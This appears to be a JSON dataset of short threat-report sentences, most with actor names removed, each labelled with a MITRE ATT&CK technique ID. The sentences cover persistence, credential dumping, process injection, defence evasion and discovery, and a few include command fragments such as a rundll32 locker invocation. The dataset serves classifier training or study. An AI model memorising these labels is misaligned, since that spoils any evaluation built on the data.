    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "ran a reverse shell with Meterpreter.(Citation: Cymmetria Patchwork)  used JavaScript code and .SCT files on victim machines.(Citation: TrendMicro Patchwork Dec 2017)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used batch scripts to perform reconnaissance.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used  for credential dumping.(Citation: FireEye FIN6 April 2016)",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Pupy can communicate using multiple transports, migrate into processes using reflective injection, and load remote python code, python packages and python C-extensions from memory",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used built-in API functions such as WNetOpenEnumW() WNetEnumResourceW() WNetCloseEnum() GetProcAddress() and VirtualAlloc().(Citation: Mcafee Clop Aug 2019)",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has been executed via compromised installation files for legitimate software including compression applications security software browsers file recovery applications and other tools and utilities.(Citation: Talos Promethium June 2020)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "SecretsDump and  modules within  can perform credential dumping to obtain account and password information.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to stop antivirus services and disable Windows Defender. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "attempted to disable software security services following checks against a FNV-1a + XOR hashed hardcoded blocklist.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "used malware to download additional malicious files to the target system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has been observed enumerating system drives and partitions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "stages command output and collected data in files before exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect system information from the victims machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can download additional files onto the infected system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The script will then execute the downloaded file",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "using the following command line:\n\n\nC:\\Windows\\System32\\cmd.exe /c",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can obtain the name of the logged-in user on the victim.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has communicated with its C2 servers via HTTPS protocol.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can create a new service using the service parser function ProcessScCommand. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "creates run key Registry entries pointing to a malicious executable dropped to disk.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP in C2 communication.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can run the ShellExecuteW API via the Windows Command Shell.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The backdoor will modify the registry for the Windows Media Player to store its C&C configuration.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "and injects Qakbot into wermgr.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "communicates with its C2 server using HTTPS",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to enumerate processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can read files,",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has deleted itself and associated artifacts from victim machines.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The verb get can be used in a myriad of ways to retrieve information for a machine, however in this case os get /format: is being abused to download payloads from non-local resources with .xsl extensions",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "with the syscall instruction",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can be issued a command shell function from the C2.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "established persistence using Registry Run keys both to execute PowerShell and VBS scripts as well as to execute their backdoor directly.(Citation: Cybereason Oceanlotus May 2017)(Citation: Cybereason Cobalt Kitty 2017)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Most of them manipulate the machine to download and execute different files",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can check for existing stratum cryptomining information in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\spreadCpuXmr  %stratum info%.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can establish persistence by creating a service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "collects current and parent process IDs.(Citation: Fidelis Turbo)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has modified registry keys for persistence to enable credential caching for credential access and to facilitate lateral movement via RDP.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can collect the hostname operating system configuration product ID and disk space on victim machines by executing .",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used `ipconfig /all` on a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can obtain the IP address of a victim host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "backdoor RoyalDNS established persistence through adding a service called Nwsapagent.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has disabled and uninstalled security tools such as Alibaba Tencent and BMC cloud monitoring agents on cloud-based infrastructure.(Citation: ATT TeamTNT Chimaera September 2020)",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can upload and download files to the victim.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the submitter collected the files from different places",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can kill AV products' processes. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can list files and directories.(Citation: ESET Sednit Part 2)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The commands executed included directory traversal,",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has been injected directly into a running process including `explorer.exe`.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "rundll32 locker_32.dll,run",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "delete important files",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "gathered a list of running processes on the system using tasklist /v.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": " Win32 API",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can collect the IP address of the victim machine and spawn instances of netsh.exe to enumerate wireless settings.(Citation: DigiTrust Agent Tesla Jan 2017) ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "installs a copy of itself in a randomly selected service then overwrites the ServiceDLL entry in the service's Registry entry. Some  variants also install .dll files as services with names generated by a list of hard-coded strings.(Citation: US-CERT Volgmer Nov 2017)(Citation: US-CERT Volgmer 2 Nov 2017)",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can utilize cmd.exe to execute commands in a victim's environment.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Perhaps they plan to pair this stealer with another dropper that maintains the WMI anti-AV functionality",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download files to the victim's machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "lists running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve OS name/architecture and computer/domain name information from compromised hosts.(Citation: FireEye MuddyWater Mar 2018)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can maintain persistence by creating an auto-run Registry key.(Citation: Trend Micro Qakbot May 2020)(Citation: Crowdstrike Qakbot October 2020)(Citation: Trend Micro Qakbot December 2020)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "executed the \"tasklist /SVC\" command to list all running processes on the victim device.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "This adversary starts with obtaining usernames",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "dispatcher has used CreateProcessW API for execution.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "to use WMI for storage and\npersistence.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has overwritten registry keys for persistence.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Sets various registry values",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has a data wiper component that enumerates keys in the Registry HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "17-3 Function names To target specific victims, Astaroth is locale aware; any attempts to run the malware without locale spoofing will result in failed downloads and the inability to run the .dll files",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": " searches for the Kubernetes config file and other related files using a regular expression. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can use scheduled tasks to achieve persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Trickbot uses this encrypted module to scan the network and steal relevant network information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "used different compromised credentials for remote access and to move laterally.(Citation: FireEye SUNBURST Backdoor December 2020)",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has a plugin designed to obtain a list of processes.(Citation: Threatpost Lizar May 2021)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTPS in communication with C2 web servers.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "http/https data transfer",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "used letmein to scan for saved usernames on the target system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to modify a Registry Run key to establish persistence.(Citation: Trend Micro DRBControl February 2020)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "they use tools such as Mimikatz to dump credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "performs the tasklist command to list running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "after the user clicks on the malicious link or opens the attachment.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Command Description   !Dir Lists the contents of a specified directory   !Drives Enumerates the storage drives attached to the system and their respective type",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the computer name and OS version on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "identifies the victim username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "used the WMI query Select * From Win32_SystemDriver to retrieve a driver listing.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The Granted Access level matches know indicators for Mimikatz",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has registered itself as a service using its export function. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the current username of an infected host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can download additional modules from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "collects the victim hostname window resolution and Microsoft Windows version.(Citation: Palo Alto menuPass Feb 2017)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "adds keys to the Registry at HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services and various other Registry locations.(Citation: SANS Conficker)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "a given user account was also authenticating to Active Directory from a given source IP address two years prior",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can create a scheduled task to establish persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "gaining credential access into victim networks by using legitimate, but compromised credentials to access OWA servers, corporate login portals, and victim networks.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can obtain information about network parameters.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has a tool that can obtain information about the local system.(Citation: Symantec Buckeye)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The POST event included a MIME part indicating file upload",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used compromised VPN accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "created new services for shellcode loaders distribution.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor connected via Remote Desktop",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP for C2 communications.(Citation: Infoblox Lokibot January 2019) ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can download and upload files to and from the victims machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve data from specific Windows directories as well as open random files as part of .",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "In order to steal credentials, the attackers employ custom modified versions of Mimikatz",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "An instance of cmd.exe was launched through explorer.exe which ran the following command",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "the file will be deleted",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can disable SELinux Role-Based Access Control and deactivate PAM modules.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can deploy additional components or tools as needed.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can use `cmd.exe` to drop and run files.(Citation: Google EXOTIC LILY March 2022)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uses a batch file that configures the ComSysApp service to autostart in order to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has modified the Registry as part of its UAC bypass process. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can use tasklist to gather information about the process running on the infected system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "func_GetTotalRAM()",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Using Mimikatz and dumping of lsass,",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can identify the OS version CPU and other details from a victim's machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The shellcode is stored in the registry,",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "20 New processes The malicious svchost constantly queries ieframe.dll, as well as IWebBrowser2 Interface using CLSID dc30c1661-cdaf-11D0-8A3E-00c04fc9e26e, both key components to interact with Internet Explorer",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has deleted files associated with their payload after execution.(Citation: FireEye APT34 Dec 2017)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The actors used RDP to move laterally to multiple hosts on the network.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "In this context the main function is executed.\"Console\": with the argument, a persistence is configured and the malware will be executed at the next reboot ( HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\runsample ).\"Sample\": with this argument, the malware executes the console command followed by the help command.The information collected is performed using WMI queries:Additionally the malware lists the running process via the Microsoft Windows API",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "the threat actors conducted further discovery tasks running find.bat and p.bat,",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can identify the MAC address on the target computer.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can open a command-line interface.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the MAC address of a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "This function is\npatched using Microsoft Detours—a publicly available library used for\ninstrumenting Win32\nfunctions—so",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Responsible for installing persistence via scheduled tasks",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve IP network adapter configuration information and domain from compromised hosts.(Citation: FireEye MuddyWater Mar 2018)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Microsoft Windows Defender AntiSpyware Protection disabled",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can set its configuration parameters in the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Some  samples use cmd.exe to delete temporary files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can use `cmd.exe` to execute commands received from C2.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has added a registry key so future powershell.exe instances are spawned off-screen by default and has removed all registry entries that are left behind during the dropper process.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors used scheduled tasks to execute malicious PowerShell code on remote systems.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can discover and collect victim system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can collect data from an infected local host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "a payload download code that grabs malware to download and install the backdoor.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ProcDump was used to dump LSASS memory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to query device information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can search for different processes on a system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to gather the victim's current directory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP for C2 communication.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "is capable of spawning a Windows command shell.(Citation: EFF Manul Aug 2016)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Manual interactions are required",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "malware communicates with its C2 server via HTTPS.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "used process hollowing to launch under the context of the Dllhost.exe process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate processes on a victim machine through use of .",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "its C2 server via a\nsubsequent HTTP POST request.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Some  samples install themselves as services for persistence by calling WinExec with the net start argument.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "obtained OS version and hardware configuration from a victim.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has enumerated processes by ID name or privileges. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Remote access tools used by the attackers may use application layer protocols (HTTP, HTTPS,",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "collected file listings of all default Windows directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to gather the IP address from the victim's machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Upload and execute a well-known (e.g., with a signature) malicious file to a target DC system",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has searched the entire target system for DOC DOCX PPT PPTX XLS XLSX and PDF files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "collects the IP address and MAC address from the system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download and execute additional payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can execute shell commands.  can execute commands with JavaScript.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "successfully got a valid domain admin account this way.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has used batch scripts to download tools and executing cryptocurrency miners.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Operating system's name (i.e., the name of the machine) Operating system's OS architecture Operating system's caption Computer system's domain Computer system's username Computer's public IP address",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used the Windows API to communicate with the Service Control Manager to execute a thread.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can download additional files onto the host. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has executed the tasklist command.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "An older version of  has a module that monitors all mounted volumes for files with the extensions .doc .docx .pgp .gpg .m2f or .m2o.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Delete file or folder",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "injects its malware variant  into the cmd.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "executes an embedded batch file.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The  dropper creates and starts a Windows service named wsmprovav with the description Windows Check AV.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can be used to find information about the operating system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can exfiltrate files from the system using a documents collector tool.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "downloading of the next stage.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "that hashes each running process on the system",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "collects registered owner details by using the commands systeminfo and net config workstation.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "schedules tasks to invoke its components in order to establish persistence.(Citation: Palo Alto Gamaredon Feb 2017)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor used a compromised O365 administrator account",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "to track which of the 3 processes are running on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has been executed through luring victims into opening malicious documents.(Citation: FireEye NETWIRE March 2019)(Citation: Unit 42 NETWIRE April 2020)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "the file is deleted to remove evidence from the machine.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can inject content into lsass.exe to load a module.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "the executable ‘3ujwy2rz7v.exe’ was downloaded",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "gathered the local proxy domain IP routing tables mac address gateway DNS servers and DHCP status information from an infected host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has gained execution through luring victims into opening malicious files.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "a batch script used",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "scanning files in a specified or generic path",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "After running the malware, the batch script goes on to cleans up all signs of its existence on the system, this includes:  Deletion of all initial files created during installation, as well as all associated files required on disk during initial execution",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate victims' local and external IPs when registering with C2.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTPS for C2.(Citation: Talos Cobalt Group July 2018)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "then executed via WMI.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can run cmd through an IRC channel.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "After this file is copied, the original ‘Update.~tmp’ file is deleted",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has collected the computer name and OS architecture information from the system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has lured victims to execute malicious attachments included in crafted spearphishing emails related to current topics.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can use a number of different APIs for discovery and execution.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has established persistence by using the Registry option in PowerShell Empire to add a Run key.(Citation: FireEye FIN10 June 2017)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "calls Stage 1 again via process hollowing with four parameters",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "attempts to obtain legitimate credentials during operations.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "a heavy emphasis on Remote Desktop Protocols.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "deletes the Registry key HKCU\\Software\\Classes\\Applications\\rundll32.exe\\shell\\open.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "C:\\Windows\\System32\\cmd.exe /C dir",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can be used to collect data from local file systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to overwrite scripts and delete itself if a sandbox environment is detected.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "is capable of setting and deleting Registry values.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can use WMI to delete volume shadow copies.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "modifies conditions in the Registry and adds keys.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "A  file stealer can gather the victim's computer name and drive serial numbers to send to a C2 server.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: TrendMicro Gamaredon April 2020)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
